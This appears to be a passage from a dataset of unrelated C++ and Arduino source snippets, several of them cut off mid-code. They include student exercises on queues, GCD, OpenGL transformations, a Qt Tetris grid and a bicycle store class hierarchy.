&exp_vec;\n\t}\n\n\t//",
    "// HW11_queue_shell.cpp (shell)\n// CS225\n// By Bin \"Crystal\" Peng\n//\n// ch12 inheritance, virtual\n//\n// HW11. Build a queue class via inheritance\n// queue inherits unorderedArrayListType (ch12. p881)\n// unorderedArrayListType inherits arrayListType (ch12. p874)\n\n#include <iostream>\n\n//--------------\n// arrayListType (super)\n//--------------\nclass arrayListType\n{\n  friend std::ostream& operator<<(std::ostream&, const arrayListType&);\n\npublic:\n  bool isEmpty() const;\n  bool isFull() const;\n  int listSize() const;\n  int maxListSize() const;\n\n  bool isItemAtEqual(int location, int item) const;\n  void removeAt(int location);\n  void retrieveAt(int location, int& retItem) const;\n  void clearList();\n\n  virtual int seqSearch(int searchItem) const = 0;\n  virtual void insertAt(int location, int insertItem) = 0;\n  virtual void insertEnd(int insertItem) = 0;\n  virtual void replaceAt(int location, int repItem) = 0;\n  virtual void remove(int removeItem) = 0;\n\n  arrayListType(int size = 100);\n  arrayListType(const arrayListType& otherList);\n  virtual ~arrayListType();\n\nprotected:\n  int *list;    //array to hold the list elements\n  int length;   //length of the list\n  int maxSize;  //the maximum size of the list\n};\n\n//--------------\n// unorderedArrayListType (sub)\n//--------------\n\nclass unorderedArrayListType : public arrayListType\n{\npublic:\n  void insertAt(int location, int insertItem);\n  void insertEnd(int insertItem);\n  void replaceAt(int location, int repItem);\n  int seqSearch(int searchItem) const;\n  void remove(int removeItem);\n\n  unorderedArrayListType(int size = 100); //Constructor\n};\n\n//--------------\n// queue (grand-sub)\n//--------------\nclass queue : private unorderedArrayListType\n{\npublic:\n  bool isEmpty() const; // test whether queue is empty\n  // Post: returns true if queue is empty, otherwise returns false\n\n  int size() const; // return size\n  // Post: returns the number of elements in the queue\n\n  int front() const; // returns the element at the front of the queue. This should be the \"oldest\" element, the same element that will be removed if deque() is called next\n  // Pre: the queue is not empty\n  // Post: returns the element at the front of the queue\n\n  int back() const; // returns the element at the back of the queue. This should be the \"youngest\" element, the same element that was added into the queue most recently using enque()\n  // Pre: the queue is not empty\n  // Post: returns the element at the back of the queue\n\n  void enque(int newItem); // insert one element at the back of the queue, after its current last element (the \"youngest\" element before this enque)\n  // Post: newItem added at the end of the queue, after the current last element\n\n  int deque(); // remove one element from the front of the queue. The \"oldest\" element should be removed\n  // Pre: the queue is not empty\n  // Post: the item at the front of the queue is removed from the queue and returned\n\n  queue(int size = 100);\n  // Post: queue initialized with capacity being size param and contains 0 elements.\n  //       if no size is specified, 100 is used for the capacity\n};\n\n\n\n//--------------\n// client code\n//--------------\n\n\nint main()\n{\n  unorderedArrayListType intList(25);\n\n  for (int i = 0; i < 8; i++)\n    intList.insertEnd(i * 10 + 5);\n  std::cout << \"intList: \" << intList << std::endl;\n\n  //Create temp and initialize it using intList\n  unorderedArrayListType temp(intList);\n  std::cout << \"temp: \" << temp << std::endl;\n\n  //Replace the first element of temp.\n  temp.replaceAt(0, -75);\n  std::cout << \"temp first element replaced: \" << temp << std::endl;\n\n  std::cout << \"intList: \" << intList << std::endl;\n\n  return 0;\n} // end main\n\n//---------------------\n// Implementation\n//---------------------\n\nbool arrayListType::isEmpty() const\n{\n  return (length == 0);\n} //end isEmpty\n\nbool arrayListType::isFull() const\n{\n  return (length == maxSize);\n} //end isFull\n\nint arrayListType::listSize() const\n{\n  return length;\n} //end listSize\n\nint arrayListType::maxListSize() const\n{\n  return maxSize;\n} //end maxListSize\n\nbool arrayListType::isItemAtEqual(int location, int item)  const\n{\n  if (location < 0 || location >= length)\n  {\n    std::cout << \"The location of the item to be removed \"\n      << \"is out of range.\\n\";\n\n    return false;\n  }\n  else\n    return (list[location] == item);\n} //end isItemAtEqual\n\nvoid arrayListType::removeAt(int location)\n{\n  if (location < 0 || location >= length)\n    std::cout << \"The location of the item to be removed \"\n    << \"is out of range.\\n\";\n  else\n  {\n    for (int i = location; i < length - 1; i++)\n      list[i] = list[i + 1];\n\n    length--;\n  }\n} //end removeAt\n\nvoid arrayListType::retrieveAt(int location, int& retItem) const\n{\n  if (location < 0 || location >= length)\n    std::cout << \"The location of the item to be retrieved is \"\n    << \"out of range\\n\";\n  else\n    retItem = list[location];\n} //end retrieveAt\n\nvoid arrayListType::clearList()\n{\n  length = 0;\n} //end clearList\n\narrayListType::arrayListType(in",
    "#include <vector>\n#include <iostream>\n#include <boost/filesystem.hpp>\n#include <boost/program_options.hpp>\n#include <boost/property_tree/ptree.hpp>\n#include <boost/property_tree/json_parser.hpp>\n\n\n#include \"Catalog.h\"\n#include \"Features.h\"\n#include \"Fixation.h\"\n#include \"VocabularyTree.h\"\n\n#define _USE_MATH_DEFINES\n#include <math.h>\n\nnamespace po = boost::program_options;\n\ntemplate <typename T>\nstd::vector<T> as_vector(boost::property_tree::ptree const& pt, boost::property_tree::ptree::key_type const& key) {\n    std::vector<T> r;\n    for (auto& item : pt.get_child(key))\n        r.push_back(item.second.get_value<T>());\n    return r;\n}\n\nboost::property_tree::ptree load_config(const std::string& filename) {\n    boost::property_tree::ptree pt;\n    boost::property_tree::read_json(filename, pt);\n    return pt;\n}\n\nCatalog load_catalog(boost::property_tree::ptree const& pt) {\n    auto timestamps = as_vector<size_t>(pt, \"timestamps\");\n    auto gaze       = as_vector<std::string>(pt, \"gaze\");\n    auto videos     = as_vector<std::string>(pt, \"videos\");\n    auto vocabPath = pt.get<std::string>(\"vocabulary\");\n    auto tracker_rate = pt.get<double>(\"tracker_rate\");\n    return Catalog(videos, gaze, timestamps, vocabPath, tracker_rate);\n}\n\nvoid compute_vocabulary_tree(Catalog& catalog, boost::property_tree::ptree const &config, const std::string& filename) {\n    const int subsample = config.get<int>(\"subsample\");\n    const int clusters = config.get<int>(\"clusters\");\n    const int height = config.get<int>(\"height\");\n    const int batchSize = config.get<int>(\"batch_size\");\n    const int minDescriptors = config.get<int>(\"min_descriptors\");\n    const int max_iterations = config.get<int>(\"max_iterations\");\n    const int max_no_improvements = config.get<int>(\"max_no_improvements\");\n    const double tolerance = config.get<double>(\"tolerance\");\n    const bool in_memory = config.get<bool>(\"in_memory\");\n\n    VocabularyTree tree(clusters, height, batchSize, minDescriptors, max_iterations, max_no_improvements, tolerance, catalog, filename);\n    tree.create(subsample, in_memory);\n    catalog.unload();\n}\n\nvoid compute_fixation(Catalog& catalog, boost::property_tree::ptree const& config, const std::string& filename, EvaluationMethod eval) {\n    // auto angle2Screen = +[](const GazePoint& p) {\n    //     return p;\n    //     constexpr double verticalFov = M_PI * 110.0 / 180.0;\n    //     constexpr double screenWidth = 1080.0;\n    //     constexpr double screenHeight = 1200.0;\n    //     const double screenDist = 0.5 * screenHeight / std::tanh(verticalFov / 2.0);\n    //     const double x = (screenDist * std::tan( M_PI * p.x / 180.0) + 0.5 * screenWidth) / screenWidth;\n    //     const double y = (screenDist * std::tan(-M_PI * p.y / 180.0) + 0.5 * screenHeight) / screenHeight;\n    //     return GazePoint { static_cast<float>(x), static_cast<float>(y) };\n    // };\n\n    const bool in_memory = config.get<bool>(\"in_memory\");\n    catalog.prefetch(true, true, in_memory, nullptr);\n    VocabularyTree tree(catalog, filename);\n    Fixation fix(catalog, tree);\n\n    auto directory = boost::filesystem::path(config.get<std::string>(\"output_directory\"));\n    if (!boost::filesystem::exists(directory)) {\n        boost::filesystem::create_directory(directory);\n    }\n\n    auto indices = catalog.getVideoIndices();\n    for (auto index : indices) {\n        auto filename = directory / boost::filesystem::path(\"Saliency-\" + std::to_string(index) + \".avi\");\n        if (boost::filesystem::exists(filename)) {\n            std::cout << \"Skip Fixation: \" << index << std::endl;\n        } else {\n            std::cout << \"Compute Fixation: \" << index << std::endl;\n            fix.computeFixation(filename.string(), static_cast<uint32_t>(index), config, eval);\n        }\n    }\n}\n\nint main(int argc, char* argv[]) {\n    po::options_description config(\"Global options\");\n    config.add_options()\n        (\"command\", po::value<std::string>()->required(), \"Command to execute (desc, tree, fix)\")\n        (\"catalog\", po::value<std::string>()->required(), \"The video, gaze, scene label and timestamp data to create the descriptors from.\")\n    ;\n\n    po::variables_map vm;\n    po::store(po::parse_command_line(argc, argv, config), vm);\n    po::notify(vm);\n\n    //po::store(parsed, vm);\n    std::string cmd = vm[\"command\"].as<std::string>();\n    if (cmd == \"desc\") {\n        std::cout << \"Compute Descriptors\" << std::endl;\n        auto config = load_config(vm[\"catalog\"].as<std::string>());\n\n        Catalog catalog = load_catalog(config);\n        auto pt = config.get_child(\"features\");\n        compute_descriptors(catalog, pt);\n    }\n    else if (cmd == \"tree\") {\n        std::cout << \"Compute Vocabulary Tree\" << std::endl;\n        auto config = load_config(vm[\"catalog\"].as<std::string>());\n\n        Catalog catalog = load_catalog(config);\n        auto pt = config.get_child(\"tree\");\n        compute_vocabulary_tree(catalog, pt, config.get<std::string>(\"filename\"));\n    }\n    else if (cmd == \"fixation",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n\nusing namespace std;\n\nclass Product {\nprotected:\n    string brand;\n    string name;\n    double price;\n    int year;\n\npublic:\n    virtual ~Product() {}\n\n    Product(const string& brand, const string& name, double price, int year) {\n        this->brand = brand;\n        this->name = name;\n        this->price = price;\n        this->year = year;\n    }\n\n    string getBrand() const {\n        return brand;\n    }\n\n    string getName() const {\n        return name;\n    }\n\n    double getPrice() const {\n        return price;\n    }\n\n    int getYear() const {\n        return year;\n    }\n\n    virtual void printBicycle() const {\n        cout << \"Brand: \" << brand << endl;\n        cout << \"Name: \" << name << endl;\n        cout << \"Price: \" << price << \"$\" << endl;\n        cout << \"Year: \" << year << endl;\n    }\n};\n\nclass Bicycle : public Product {\nprivate:\n    double wheel;\n    double weight;\n    string color;\n\npublic:\n    virtual ~Bicycle() {}\n\n    Bicycle(const string& brand, const string& name, double wheel, double weight, const string& color, double price, int year) : Product(brand, name, price, year) {\n        this->brand = brand;\n        this->name = name;\n        this->wheel = wheel;\n        this->weight = weight;\n        this->color = color;\n        this->price = price;\n        this->year = year;\n    }\n\n    double getWheel() const {\n        return wheel;\n    }\n\n    double getWeight() const {\n        return weight;\n    }\n\n    string getColor() const {\n        return color;\n    }\n\n    virtual void printBicycle() const {\n        Product::printBicycle();\n        cout << \"Wheel size: \" << wheel << endl;\n        cout << \"Weight: \" << weight << \"kg\" << endl;\n        cout << \"Color: \" << color << endl;\n    }\n};\n\nclass Person {\nprivate:\n    string name;\n    string surname;\n    int age;\npublic:\n    virtual ~Person() {}\n    \n    Person(const string name, const string surname, const int age) {\n        this->name = name;\n        this->surname = surname;\n        this->age = age;\n    }\n\n    string getName() const {\n        return name;\n    }\n\n    string getSurname() const {\n        return surname;\n    }\n\n    int getAge() const {\n        return age;\n    }\n\n    virtual void printPerson() const {\n        cout << \"Name: \" << name << endl;\n        cout << \"Surname: \" << surname << endl;\n        cout << \"Age: \" << age << endl;\n    }\n};\n\nclass Buyer : public Person {\nprivate:\n    string product;\n    double budget;\npublic:\n    virtual ~Buyer() {}\n\n    Buyer(const string name, const string surname, const int age, const string product, const double budget) : Person(name, surname, age) {\n        this->product = product;\n        this->budget = budget;\n    }\n\n    string getProduct() const {\n        return product;\n    }\n\n    double getBudget() const {\n        return budget;\n    }\n\n    virtual void printBuyer() const {\n        printPerson();\n        cout << \"Product: \" << product << endl;\n        cout << \"Budget: \" << budget << endl;\n    }\n};\n\nclass Employee : public Person {\nprivate:\n    string post;\n    string store;\n    double salary;\npublic:\n    virtual ~Employee() {}\n\n    Employee(const string name, const string surname, const int age, const string post, const string store, const double salary) : Person(name, surname, age) {\n        this->post = post;\n        this->store = store;\n        this->salary = salary;\n    }\n    \n    string getPost() const {\n        return post;\n    }\n\n    string getStore() const {\n        return store;\n    }\n\n    double getSalary() const {\n        return salary;\n    }\n\n    virtual void printEmployee() const {\n        printPerson();\n        cout << \"Post: \" << post << endl;\n        cout << \"Store: \" << store << endl;\n        cout << \"Salary: \" << salary << endl;\n    }\n};\n\nclass Review {\nprivate:\n    const Bicycle* bicycle;\n    const Buyer* buyer;\n    double rating;\n    string text;\npublic:\n\n    virtual ~Review() {}\n\n    Review(const Bicycle& bicycle, const Buyer& buyer, double rating, const string& text) {\n        this->bicycle = &bicycle;\n        this->buyer = &buyer;\n        this->rating = rating;\n        this->text = text;\n    }\n\n    const Bicycle* getProduct() const {\n        return bicycle;\n    }\n\n    const Buyer* getBuyer() const {\n        return buyer;\n    }\n\n    double getRating() const {\n        return rating;\n    }\n\n    string getText() const {\n        return text;\n    }\n};\n\nvoid addBicycle(vector<Bicycle>& bicycles) {\n    string brand, name, color;\n    double wheel, weight, price;\n    int year;\n\n    cout << \"Enter bicycle details:\\n\" << endl;\n    cout << \"Brand: \";\n    cin >> brand;\n    cout << \"Name: \";\n    cin >> name;\n    cout << \"Wheel size: \";\n    cin >> wheel;\n    cout << \"Weight: \";\n    cin >> weight;\n    cout << \"Color: \";\n    cin >> color;\n    cout << \"Price: \";\n    cin >> price;\n    cout << \"Year: \";\n    cin >> year;\n\n    bicycles.emplace_back(brand, name, wheel, weight, color, price, year);\n}\n\nstatic void addBuyer(vector",
    "#include \"fileoutputgeneratorfactory.hpp\"\n\nusing namespace std;\n\nshared_ptr<FileOutputGenerator> FileOutputGeneratorFactory::create_file_output_generator(GMGraph gm, ATGraph mission_decomposition, vector<ground_literal> world_state, vector<pair<ground_literal,variant<int,float>>> world_state_functions, pair<string,string> output, bool verbose, bool pretty_print) {\n    shared_ptr<FileOutputGenerator> file_output_gen;\n\n    if(output.second == \"XML\") {\n        file_output_gen = std::make_shared<XMLOutputGenerator>();\n        file_output_gen->set_file_output_generator_type(XMLFILEOUTGEN);\n    } else if(output.second == \"JSON\") {\n        file_output_gen = std::make_shared<JSONOutputGenerator>();\n        file_output_gen->set_file_output_generator_type(JSONFILEOUTGEN);\n    }\n    \n    file_output_gen->set_gm(gm);\n    file_output_gen->set_mission_decomposition(mission_decomposition);\n    file_output_gen->set_world_state(world_state);\n    file_output_gen->set_world_state_functions(world_state_functions);  \n    file_output_gen->set_output(output);\n    file_output_gen->set_verbose(verbose);\n    file_output_gen->set_pretty_print(pretty_print);\n\n    return file_output_gen;\n}",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint EuclideanGCD(int m, int n) // Fungsi melalui cara normal sesuai dengan soal \r\n{\r\n    int r; //inilisialisasi r harus dibuat dalam fungsi ini\r\n    while(r != 0) // Lakukan langkah dibawah berulang sampai r bernilai 0\r\n    {\r\n        r = m % n; //Masukkan nilai sisa pembagian dari m dibagi n kedalam suatu variabel\r\n        m = n; //Masukkan nilai n kedalam variabel m\r\n        n = r; // kemudian masukkan nilai r kedalam variabel n\r\n    }\r\n    return m; //nilai terakhir dari m akan menjadi FPB dari dua bilangan awal\r\n}\r\n\r\nint main()\r\n{\r\n    int nilai1,nilai2; //membuat variable nilai1 dan 2\r\n    cout <<\"=========================\\nPROGRAM MENCARI FPB\\n=========================\\n\"; // title (\u30ce\u0ca0\u76ca\u0ca0)\u30ce\u5f61\u253b\u2501\u253b\r\n    cout<<\"Masukan bilangan pertama: \"; cin >> nilai1; // Input bil pertama ke variable nilai1\r\n    cout<<\"Masukkan bilangan kedua: \"; cin>> nilai2; // Input bil pertama ke variable nilai2\r\n    \r\n    int hasil = EuclideanGCD(nilai1, nilai2); //Memanggil fungsi EuclideanGCD\r\n\r\n    cout<<\"FPB dari \"<<nilai1<<\" dan \"<<nilai2<<\" adalah \"<<hasil; //Output\r\n}",
    "#include \"tetristable.h\"\n//#include \"nextblock.h\"\n#include <QBrush>\n#include <QDebug>\n#include <QHeaderView>\n\ntetristable::tetristable(QWidget *parent) : QTableWidget{parent} {\n  // \u8868\u683c\u7684\u884c\u548c\u5217\u8bbe\u7f6e\n  this->setRowCount(TABLE_ROW);\n  this->setColumnCount(TABLE_COLUMN);\n\n  // \u5173\u95ed\u6eda\u52a8\u6761\n  this->setVerticalScrollBarPolicy(Qt::ScrollBarAlwaysOff);\n  this->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff);\n\n  // \u9690\u85cf\u8868\u5934\n  this->horizontalHeader()->setVisible(false);\n  this->verticalHeader()->setVisible(false);\n\n  // \u7981\u6b62\u9009\u4e2d\u548c\u7f16\u8f91\u5355\u5143\u683c\n  this->setSelectionMode(QAbstractItemView::NoSelection);\n  this->setEditTriggers(QAbstractItemView::NoEditTriggers);\n\n  // \u8bbe\u7f6e\u7f51\u683c\u7ebf\u53ef\u89c1\u548c\u6837\u5f0f\n  this->setShowGrid(true);\n  this->setGridStyle(Qt::DashDotLine);\n\n  // \u5217\u5bbd\u548c\u884c\u9ad8\u81ea\u52a8\u8c03\u6574\n  this->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);\n  this->verticalHeader()->setSectionResizeMode(QHeaderView::Stretch);\n\n  // \u521d\u59cb\u5316\u8868\u683c\u5355\u5143\u683c\n  // \u83b7\u53d6\u8868\u683c\u4e2d\u7b2c\u4e00\u5217\u7684\u5bbd\u5ea6\n  int cellWidth = this->columnWidth(0);\n  for (int i = 0; i < TABLE_ROW; ++i) {\n    // \u786e\u4fdd\u884c\u9ad8\u4e0e\u5217\u5bbd\u76f8\u7b49\n    this->setRowHeight(i, cellWidth);\n    // \u5c06\u8868\u683c\u521d\u59cb\u5316\u4e3a\u5177\u6709\u6307\u5b9a\u884c\u6570\u548c\u5217\u6570\u7684\u7f51\u683c\n    for (int j = 0; j < TABLE_COLUMN; ++j) {\n      mp_items[i][j] = new QTableWidgetItem();\n      this->setItem(TABLE_ROW - i - 1, TABLE_COLUMN - j - 1, mp_items[i][j]);\n    }\n  }\n}\n\ntetristable::~tetristable() { this->clear(); }\n\n// \u66f4\u65b0\u8868\u683c\nvoid tetristable::updateTable(quint16 *data) {\n  if (!data)\n    return;\n//  auto color = generateBrightColor();\n  for (int i = 0; i < TABLE_ROW; ++i) {\n    // \u4f7f\u7528\u63a9\u7801\u6765\u786e\u5b9atempValue\u7684\u54ea\u4e00\u4f4d\u88ab\u8bbe\u7f6e\n    quint16 tempVal = data[i];\n    for (int j = 0; j < TABLE_COLUMN; ++j) {\n      quint16 temp = 0x01;\n      temp <<= j;\n      temp = tempVal & temp;\n      if (temp == 0) {\n        mp_items[i][j]->setBackground(QBrush(QColor(255, 255, 255)));\n      } else {\n        mp_items[i][j]->setBackground(QBrush(QColor(102, 204, 255)));\n      //    mp_items[i][j]->setBackground(QBrush(color));\n      //    QColor currentColor = mp_items[i][j]->background().color();\n      //    if (currentColor == QColor(255, 255, 255)) {  // \u68c0\u67e5\u5f53\u524d\u989c\u8272\u662f\u5426\u4e3a\u767d\u8272\n      //        mp_items[i][j]->setBackground(QBrush(color));\n      //    }\n       }\n    }\n  }\n}\n\nvoid tetristable::keyPressEvent(QKeyEvent *event) {\n  switch (event->key()) {\n  case Qt::Key_Up:\n    emit signal_out_keyPress_up();\n    break;\n  case Qt::Key_Left:\n    emit signal_out_keyPress_left();\n    break;\n  case Qt::Key_Right:\n    emit signal_out_keyPress_right();\n    break;\n  case Qt::Key_Down:\n    emit signal_out_keyPress_down();\n    break;\n  case Qt::Key_Space:\n    emit signal_out_keyPress_space();\n    break;\n  case Qt::Key_Enter:\n    emit signal_out_keyPress_enter();\n      break;\n  case Qt::Key_F2:\n    emit signal_out_keyPress_pause();\n    break;\n  default:\n    break;\n  }\n}\n",
    "exp 6)void setup() {\r\n  // Initialize serial communication\r\n  Serial.begin(9600);\r\n  \r\n  // Wait for the serial port to open\r\n  while (!Serial) {\r\n    ;\r\n  }\r\n  \r\n  // Prompt the user to enter a number\r\n  Serial.println(\"Enter a number:\");\r\n}\r\n\r\nvoid loop() {\r\n  // Check if data is available to read from the Serial Monitor\r\n  if (Serial.available() > 0) {\r\n    // Read the entered number\r\n    int number = Serial.parseInt();\r\n    \r\n    // If a valid number is entered\r\n    if (number != 0) {\r\n      // Square the entered number\r\n      int square = number * number;\r\n      \r\n      // Print the squared number to the Serial Monitor\r\n      Serial.print(\"The square of \");\r\n      Serial.print(number);\r\n      Serial.print(\" is \");\r\n      Serial.println(square);\r\n      \r\n      // Prompt the user to enter another number\r\n      Serial.println(\"Enter another number:\");\r\n    }\r\n    // If an invalid number or non-numeric input is entered\r\n    else {\r\n      // Clear the serial buffer\r\n      while (Serial.available() > 0) {\r\n        Serial.read();\r\n      }\r\n      \r\n      // Prompt the user to enter a valid number\r\n      Serial.println(\"Invalid input. Please enter a number:\");\r\n    }\r\n  }\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"expense_tracker\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <GL/glut.h>\n#include <cmath>\nusing namespace std;\n\nstatic int main_menu, submain_menu;\nfloat x1, y_1, x2, y2, x3, y3, ABC1[3][2];\nvoid myInit();\nvoid display(void);\nvoid dis_ori();\nvoid translation();\nvoid rotation();\nvoid shearing();\nvoid reflection();\nvoid scaling();\nvoid menu(int);\n\nvoid myInit(void)\n{\n    glClearColor(0.0, 0.0, 0.0, 0.0);\n    glMatrixMode(GL_PROJECTION);\n    gluOrtho2D(-1000, 1000, -1000, 1000);\n}\nvoid display(void)\n{\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n    glColor3f(1.0f, 1.0f, 1.0f);\n    glBegin(GL_LINES);\n    glVertex2d(1000, 0);\n    glVertex2d(-1000, 0);\n    glVertex2d(0, 1000);\n    glVertex2d(0, -1000);\n    glEnd();\n    dis_ori();\n    glFlush();\n}\nvoid translation()\n{\n    int tx = 50;\n    int ty = 70;\n    ABC1[0][0] = x1;\n    ABC1[0][1] = y_1;\n\n    ABC1[1][0] = x2;\n    ABC1[1][1] = y2;\n\n    ABC1[2][0] = x3;\n    ABC1[2][1] = y3;\n\n    ABC1[0][0] += tx;\n    ABC1[1][0] += tx;\n    ABC1[2][0] += tx;\n\n    ABC1[0][1] += ty;\n    ABC1[1][1] += ty;\n    ABC1[2][1] += ty;\n\n    glColor3f(1.0, 1.0, 0.0);\n    glBegin(GL_LINE_LOOP);\n    glVertex2d(ABC1[0][0], ABC1[0][1]);\n    glVertex2d(ABC1[1][0], ABC1[1][1]);\n    glVertex2d(ABC1[2][0], ABC1[2][1]);\n    glEnd();\n    glFlush();\n}\nvoid scaling()\n{\n    float tx = 1.5;\n    float ty = 2;\n    ABC1[0][0] = x1;\n    ABC1[0][1] = y_1;\n\n    ABC1[1][0] = x2;\n    ABC1[1][1] = y2;\n\n    ABC1[2][0] = x3;\n    ABC1[2][1] = y3;\n\n    ABC1[0][0] *= tx;\n    ABC1[1][0] *= tx;\n    ABC1[2][0] *= tx;\n\n    ABC1[0][1] *= ty;\n    ABC1[1][1] *= ty;\n    ABC1[2][1] *= ty;\n\n    glColor3f(1.0, 1.0, 0.0);\n    glBegin(GL_LINE_LOOP);\n    glVertex2d(ABC1[0][0], ABC1[0][1]);\n    glVertex2d(ABC1[1][0], ABC1[1][1]);\n    glVertex2d(ABC1[2][0], ABC1[2][1]);\n    glEnd();\n    glFlush();\n}\nvoid shearing()\n{\n    float shx, shy;\n    shx = 1;\n    shy = 1;\n    ABC1[0][0] = x1;\n    ABC1[1][1] = y2;\n\n    ABC1[2][0] = x3;\n    ABC1[2][1] = y3;\n\n    ABC1[0][0] = abs(ABC1[0][0] + shx * y_1);\n    ABC1[0][1] = abs(ABC1[0][1] + shy * x1);\n\n    ABC1[1][0] = abs(ABC1[1][0] + shx * y2);\n    ABC1[1][1] = abs(ABC1[1][1] + shy * x2);\n\n    ABC1[2][0] = abs(ABC1[2][0] + shx * y3);\n    ABC1[2][1] = abs(ABC1[2][1] + shy * x3);\n\n    glColor3f(1.0, 1.0, 0.0);\n    glBegin(GL_LINE_LOOP);\n    glVertex2d(ABC1[0][0], ABC1[0][1]);\n    glVertex2d(ABC1[1][0], ABC1[1][1]);\n    glVertex2d(ABC1[2][0], ABC1[2][1]);\n    glEnd();\n    glFlush();\n}\nvoid reflection()\n{\n    // // ABOUT X-AXIS\n    // ABC1[0][0] = x1;\n    // ABC1[0][1] = y1;\n\n    // ABC1[1][0] = x2;\n    // ABC1[1][1] = y2;\n\n    // ABC1[2][0] = x3;\n    // ABC1[2][1] = y3;\n\n    // ABC1[0][0] = x1;\n    // ABC1[0][1] = -y1;\n\n    // ABC1[1][0] = x2;\n    // ABC1[1][1] = -y2;\n\n    // ABC1[2][0] = x3;\n    // ABC1[2][1] = -y3;\n    // glColor3f(1.0, 1.0, 0.0);\n    // glBegin(GL_LINE_LOOP);\n    // glVertex2d(ABC1[0][0], ABC1[0][1]);\n    // glVertex2d(ABC1[1][0], ABC1[1][1]);\n    // glVertex2d(ABC1[2][0], ABC1[2][1]);\n    // glEnd();\n    // glFlush();\n\n    // // ABOUT Y-AXIS\n    // ABC1[0][0] = x1;\n    // ABC1[0][1] = y1;\n\n    // ABC1[1][0] = x2;\n    // ABC1[1][1] = y2;\n\n    // ABC1[2][0] = x3;\n    // ABC1[2][1] = y3;\n\n    // ABC1[0][0] = -x1;\n    // ABC1[0][1] = y1;\n\n    // ABC1[1][0] = -x2;\n    // ABC1[1][1] = y2;\n\n    // ABC1[2][0] = -x3;\n    // ABC1[2][1] = y3;\n    // glColor3f(1.0, 1.0, 0.0);\n    // glBegin(GL_LINE_LOOP);\n    // glVertex2d(ABC1[0][0], ABC1[0][1]);\n    // glVertex2d(ABC1[1][0], ABC1[1][1]);\n    // glVertex2d(ABC1[2][0], ABC1[2][1]);\n    // glEnd();\n    // glFlush();\n\n    // // ABOUT x=y line\n    // ABC1[0][0] = x1;\n    // ABC1[0][1] = y1;\n\n    // ABC1[1][0] = x2;\n    // ABC1[1][1] = y2;\n\n    // ABC1[2][0] = x3;\n    // ABC1[2][1] = y3;\n\n    // ABC1[0][0] = y1;\n    // ABC1[0][1] = x1;\n\n    // ABC1[1][0] = y2;\n    // ABC1[1][1] = x2;\n\n    // ABC1[2][0] = y3;\n    // ABC1[2][1] = x3;\n    // glColor3f(1.0, 1.0, 0.0);\n    // glBegin(GL_LINE_LOOP);\n    // glVertex2d(ABC1[0][0], ABC1[0][1]);\n    // glVertex2d(ABC1[1][0], ABC1[1][1]);\n    // glVertex2d(ABC1[2][0], ABC1[2][1]);\n    // glEnd();\n    // glFlush();\n\n    // ABOUT origin\n    ABC1[0][0] = x1;\n    ABC1[0][1] = y_1;\n\n    ABC1[1][0] = x2;\n    ABC1[1][1] = y2;\n\n    ABC1[2][0] = x3;\n    ABC1[2][1] = y3;\n\n    ABC1[0][0] = -x1;\n    ABC1[0][1] = -y_1;\n\n    ABC1[1][0] = -x2;\n    ABC1[1][1] = -y2;\n\n    ABC1[2][0] = -x3;\n    ABC1[2][1] = -y3;\n    glColor3f(1.0, 1.0, 0.0);\n    glBegin(GL_LINE_LOOP);\n    glVertex2d(ABC1[0][0], ABC1[0][1]);\n    glVertex2d(ABC1[1][0], ABC1[1][1]);\n    glVertex2d(ABC1[2][0], ABC1[2][1]);\n    glEnd();\n    glFlush();\n}\nvoid rotation()\n{\n    float x, angle;\n    angle = 45;\n    x = 0.01745 * angle;\n    ABC1[0][0] = x1;\n    ABC1[0][1] = y_1;\n\n    ABC1[1][0] = x2;\n    ABC1[1][1] = y2;\n\n    ABC1[2][0] = x3;\n    ABC1[2][1] = y3;\n\n    ABC1[0][0] = x1 * cos(x) - y_1 * sin(x);\n    ABC1[1][0] = x2 * cos(x) - y2 * sin(x);\n    ABC1[2][0] = x3 * cos(x) - y3 * sin(x);\n\n    ABC1[0][1] = x1 * sin(x) + y_1 * cos(x);\n    ABC1[1][1] = x2 * sin(x) + y2 * cos(x);\n    A",
    "#include <iostream>\n#include <iomanip>\n#include <cmath>\n#include <cstring>\n#include <chrono>\n\n// compile + run:\n// g++ main.cpp -lopenblas -llapack && ./a.out\n\nextern \"C\" { // Multiply matrixes\n    extern int dgemm_(char *, char *, unsigned int *, unsigned int *, unsigned int *, double *, \n                    double *, unsigned int *, double *, unsigned int *, double *, double *, unsigned int *);\n}\n\nextern \"C\" { // QR DECOMPOSITION\n    extern int dgeqrf_(unsigned int *, unsigned int *, double *, unsigned int *, double *, double *, int *, int *);\n}\n\nextern \"C\" { // COPY VECTOR\n    extern int dcopy_(unsigned int *, double *, int *, double *, int *);\n}\n\nextern \"C\" { // Compute matrix Q in QR\n    extern int dorgqr_(unsigned int *, unsigned int *, unsigned int *, double *, unsigned int *, double *, double *, int *, int *);\n}\n\nextern \"C\" { // PIVOTING QR DECOMPOSITION\n    extern int dgeqp3_(unsigned int *, unsigned int *, double *, unsigned int *, int *, double *, double *, int *, int *);\n}\n\nextern \"C\" { // LU 